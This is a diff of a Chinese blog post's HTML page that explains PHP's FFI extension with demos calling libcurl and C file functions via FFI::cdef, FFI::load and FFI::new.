+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">baozongwi</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-08T01:27:18.000Z" class="dt-published" itemprop="datePublished">2024-11-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/talk/">talk</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/php/" rel="tag">php</a>, <a class="p-category" href="/tags/%E5%A7%BF%E5%8A%BF/" rel="tag">姿势</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>我知道这个姿势是在暑假的8月份好像是极客大挑战的RCE5？，一直耽搁着到现在来看看</p>
 <h1 id="0x02-question"><a href="#0x02-question" class="headerlink" title="0x02 question"></a>0x02 question</h1><h2 id="了解"><a href="#了解" class="headerlink" title="了解"></a>了解</h2><p>当PHP7.4降临，与他一同前来的还有一个强大拓展<code>PHP FFI</code></p>
 <blockquote>
 <p>它允许PHP代码调用C语言库中的函数，而无需编写和编译传统的PHP扩展。通过FFI，开发者可以直接在PHP中编写与C库的接口（bindings），而不必使用C语言编写扩展。这极大地简化了扩展PHP功能的过程，并使其更灵活。</p>
@@ -550,60 +193,45 @@
 <li><strong>定义C函数和类型</strong>：在PHP中以字符串的形式定义C语言的函数、结构体、类型等。</li>
 <li><strong>调用C函数</strong>：一旦定义了C函数，就可以像调用PHP函数一样在PHP中调用它们</li>
 </ol>
-<h3 id="FFI-cdef"><a href="#FFI-cdef" class="headerlink" title="FFI::cdef"></a>FFI::<strong>cdef</strong></h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-134035.png"
-                      alt="1"
-                ></p>
+<h3 id="FFI-cdef"><a href="#FFI-cdef" class="headerlink" title="FFI::cdef"></a>FFI::<strong>cdef</strong></h3><p><img src="/../images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-134035.png" alt="1"></p>
 <p>看不懂啊，那我们看demo，以师傅的例子来讲，我们用PHP的<code>curl</code>，和<code>libcurl</code>来进行对比</p>
 <p>首先我们修改<code>ini</code>文件</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extension=ffi</span><br><span class="line">ffi.enable=true</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extension=ffi</span><br><span class="line">ffi.enable=true</span><br></pre></td></tr></table></figure>
 
 <p>然后写demo就发现有很多问题，比如说找不到什么的，然后查了查，只有Linux才行</p>
 <p>接下来放出源码</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;https://www.laruence.com/2020/03/11/5475.html&quot;</span>;</span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;https://www.laruence.com/2020/03/11/5475.html&quot;</span>;</span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure>
 
 <p>这是不使用FFI的情况</p>
 <p>那么如果使用FFI的话</p>
 <p>curl.php</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CURLOPT_URL</span> = <span class="number">10002</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CURLOPT_SSL_VERIFYPEER</span> = <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libcurl</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&lt;&lt;&lt;CTYPE</span></span><br><span class="line"><span class="string">void *curl_easy_init();</span></span><br><span class="line"><span class="string">int curl_easy_setopt(void *curl, int option, ...);</span></span><br><span class="line"><span class="string">int curl_easy_perform(void *curl);</span></span><br><span class="line"><span class="string">void curl_easy_cleanup(void *handle);</span></span><br><span class="line"><span class="string">CTYPE</span></span><br><span class="line">    , <span class="string">&quot;libcurl.so&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CURLOPT_URL</span> = <span class="number">10002</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CURLOPT_SSL_VERIFYPEER</span> = <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libcurl</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&lt;&lt;&lt;CTYPE</span></span><br><span class="line"><span class="string">void *curl_easy_init();</span></span><br><span class="line"><span class="string">int curl_easy_setopt(void *curl, int option, ...);</span></span><br><span class="line"><span class="string">int curl_easy_perform(void *curl);</span></span><br><span class="line"><span class="string">void curl_easy_cleanup(void *handle);</span></span><br><span class="line"><span class="string">CTYPE</span></span><br><span class="line">    , <span class="string">&quot;libcurl.so&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
 
 <p>test.php</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$libcurl</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;curl.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;https://www.laruence.com/2020/03/11/5475.html&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_init</span>();</span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_perform</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_cleanup</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$libcurl</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;curl.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;https://www.laruence.com/2020/03/11/5475.html&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_init</span>();</span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_perform</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_cleanup</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure>
 
 <p>我们主要是看<code>curl.php</code>，这里的话使用了<code>FFI::cdef</code>来定义调用函数的原参数式子</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FFI::<span class="title function_ invoke__">cdef</span>(<span class="keyword">string</span> <span class="variable">$c_definition</span>, <span class="keyword">string</span> <span class="variable">$library</span>)</span><br><span class="line"><span class="comment">/*$c_definition: 这是一个字符串，包含 C 语言函数和类型的声明。可以使用 heredoc 语法来定义多行字符串，使得代码更加清晰。</span></span><br><span class="line"><span class="comment">$library: 这是一个字符串，表示要加载的共享库的名称（例如 libcurl.so 或者任何其他共享库的路径）。</span></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FFI::<span class="title function_ invoke__">cdef</span>(<span class="keyword">string</span> <span class="variable">$c_definition</span>, <span class="keyword">string</span> <span class="variable">$library</span>)</span><br><span class="line"><span class="comment">/*$c_definition: 这是一个字符串，包含 C 语言函数和类型的声明。可以使用 heredoc 语法来定义多行字符串，使得代码更加清晰。</span></span><br><span class="line"><span class="comment">$library: 这是一个字符串，表示要加载的共享库的名称（例如 libcurl.so 或者任何其他共享库的路径）。</span></span><br></pre></td></tr></table></figure>
 
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$libcurl</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&lt;&lt;&lt;CTYPE</span></span><br><span class="line"><span class="string">void *curl_easy_init();</span></span><br><span class="line"><span class="string">int curl_easy_setopt(void *curl, int option, ...);</span></span><br><span class="line"><span class="string">int curl_easy_perform(void *curl);</span></span><br><span class="line"><span class="string">void curl_easy_cleanup(void *handle);</span></span><br><span class="line"><span class="string">CTYPE</span></span><br><span class="line">    , <span class="string">&quot;libcurl.so&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$libcurl</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&lt;&lt;&lt;CTYPE</span></span><br><span class="line"><span class="string">void *curl_easy_init();</span></span><br><span class="line"><span class="string">int curl_easy_setopt(void *curl, int option, ...);</span></span><br><span class="line"><span class="string">int curl_easy_perform(void *curl);</span></span><br><span class="line"><span class="string">void curl_easy_cleanup(void *handle);</span></span><br><span class="line"><span class="string">CTYPE</span></span><br><span class="line">    , <span class="string">&quot;libcurl.so&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
 
 <p>在 PHP 中，通过使用 <code>&lt;&lt;&lt;</code> 语法，可以定义所谓的 “heredoc” 字符串，<code>CTYPE</code> 就是这个 heredoc 的标识符。所以这里我们是从<code>libcurl.so</code>里面导入了四个函数</p>
-<h3 id="FFI-load"><a href="#FFI-load" class="headerlink" title="FFI::load"></a>FFI::load</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-133939.png"
-                      alt="1"
-                ></p>
+<h3 id="FFI-load"><a href="#FFI-load" class="headerlink" title="FFI::load"></a>FFI::load</h3><p><img src="/../images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-133939.png" alt="1"></p>
 <p>那么我们接着实验如果要将结果写入文件的话，我们可以写两个文件头来进行这样的操作</p>
 <p>安装个C语言在vps避免出现问题</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc</span><br><span class="line">sudo apt install g++</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc</span><br><span class="line">sudo apt install g++</span><br></pre></td></tr></table></figure>
 
 <p>file.h</p>
-<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">fopen</span><span class="params">(<span class="type">char</span> *filename, <span class="type">char</span> *mode)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fclose</span><span class="params">(<span class="type">void</span> * fp)</span>;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">fopen</span><span class="params">(<span class="type">char</span> *filename, <span class="type">char</span> *mode)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fclose</span><span class="params">(<span class="type">void</span> * fp)</span>;</span><br></pre></td></tr></table></figure>
 
 <p>curl.h</p>
-<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FFI_LIB <span class="string">&quot;libcurl.so&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> *<span class="title function_">curl_easy_init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">curl_easy_setopt</span><span class="params">(<span class="type">void</span> *curl, <span class="type">int</span> option, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">curl_easy_perform</span><span class="params">(<span class="type">void</span> *curl)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">curl_easy_cleanup</span><span class="params">(CURL *handle)</span>;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FFI_LIB <span class="string">&quot;libcurl.so&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> *<span class="title function_">curl_easy_init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">curl_easy_setopt</span><span class="params">(<span class="type">void</span> *curl, <span class="type">int</span> option, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">curl_easy_perform</span><span class="params">(<span class="type">void</span> *curl)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">curl_easy_cleanup</span><span class="params">(CURL *handle)</span>;</span><br></pre></td></tr></table></figure>
 
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CURLOPT_URL</span> = <span class="number">10002</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CURLOPT_SSL_VERIFYPEER</span> = <span class="number">64</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CURLOPT_WRITEDATA</span> = <span class="number">10001</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$libc</span> = FFI::<span class="title function_ invoke__">load</span>(<span class="string">&quot;file.h&quot;</span>);</span><br><span class="line"><span class="variable">$libcurl</span> = FFI::<span class="title function_ invoke__">load</span>(<span class="string">&quot;curl.h&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;https://www.laruence.com/2020/03/11/5475.html&quot;</span>;</span><br><span class="line"><span class="variable">$tmpfile</span> = <span class="string">&quot;/tmp/tmpfile.out&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$ch</span> = <span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_init</span>();</span><br><span class="line"><span class="variable">$fp</span> = <span class="variable">$libc</span>-&gt;<span class="title function_ invoke__">fopen</span>(<span class="variable">$tmpfile</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_setopt</span>(<span class="variable">$ch</span>, CURLOPT_WRITEDATA, <span class="variable">$fp</span>);</span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_perform</span>(<span class="variable">$ch</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_cleanup</span>(<span class="variable">$ch</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$libc</span>-&gt;<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmpfile</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmpfile</span>);</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CURLOPT_URL</span> = <span class="number">10002</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CURLOPT_SSL_VERIFYPEER</span> = <span class="number">64</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CURLOPT_WRITEDATA</span> = <span class="number">10001</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$libc</span> = FFI::<span class="title function_ invoke__">load</span>(<span class="string">&quot;file.h&quot;</span>);</span><br><span class="line"><span class="variable">$libcurl</span> = FFI::<span class="title function_ invoke__">load</span>(<span class="string">&quot;curl.h&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;https://www.laruence.com/2020/03/11/5475.html&quot;</span>;</span><br><span class="line"><span class="variable">$tmpfile</span> = <span class="string">&quot;/tmp/tmpfile.out&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$ch</span> = <span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_init</span>();</span><br><span class="line"><span class="variable">$fp</span> = <span class="variable">$libc</span>-&gt;<span class="title function_ invoke__">fopen</span>(<span class="variable">$tmpfile</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_setopt</span>(<span class="variable">$ch</span>, CURLOPT_WRITEDATA, <span class="variable">$fp</span>);</span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_perform</span>(<span class="variable">$ch</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$libcurl</span>-&gt;<span class="title function_ invoke__">curl_easy_cleanup</span>(<span class="variable">$ch</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$libc</span>-&gt;<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmpfile</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmpfile</span>);</span><br></pre></td></tr></table></figure>
 
-<h3 id="FFI-new"><a href="#FFI-new" class="headerlink" title="FFI::new"></a>FFI::new</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-133835.png"
-                      alt="1"
-                ></p>
+<h3 id="FFI-new"><a href="#FFI-new" class="headerlink" title="FFI::new"></a>FFI::new</h3><p><img src="/../images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-133835.png" alt="1"></p>
 <p><code>FFI::new</code> 是 PHP FFI 提供的方法，用于在内存中创建一个新的 C 数据类型的实例。它的基本语法是：</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FFI::<span class="keyword">new</span>(<span class="string">&quot;type&quot;</span>, [<span class="keyword">bool</span> <span class="variable">$owned</span> = <span class="literal">true</span>], [<span class="keyword">bool</span> <span class="variable">$persistent</span> = <span class="literal">false</span>])</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FFI::<span class="keyword">new</span>(<span class="string">&quot;type&quot;</span>, [<span class="keyword">bool</span> <span class="variable">$owned</span> = <span class="literal">true</span>], [<span class="keyword">bool</span> <span class="variable">$persistent</span> = <span class="literal">false</span>])</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><code>&quot;type&quot;</code>: 这是一个字符串，表示你想要创建的 C 数据类型，例如 <code>&quot;int&quot;</code>、<code>&quot;float&quot;</code>、<code>&quot;char *&quot;</code> 等。</li>
@@ -611,16 +239,16 @@
 <li><code>$persistent</code>: 可选参数，默认为 <code>false</code>。如果为 <code>true</code>，这个内存块在请求结束时不会被释放。</li>
 </ul>
 <p>那么写个demo</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkKySag1YyfK:/opt/test<span class="comment"># php test2.php</span></span><br><span class="line">PHP Warning:  Module <span class="string">&#x27;FFI&#x27;</span> already loaded in Unknown on line <span class="number">0</span></span><br><span class="line"><span class="keyword">int</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">int</span>(<span class="number">5</span>)</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkKySag1YyfK:/opt/test<span class="comment"># php test2.php</span></span><br><span class="line">PHP Warning:  Module <span class="string">&#x27;FFI&#x27;</span> already loaded in Unknown on line <span class="number">0</span></span><br><span class="line"><span class="keyword">int</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">int</span>(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
 
 <p>这里只简单说说这三种，还有很多师傅们自己拓展哦</p>
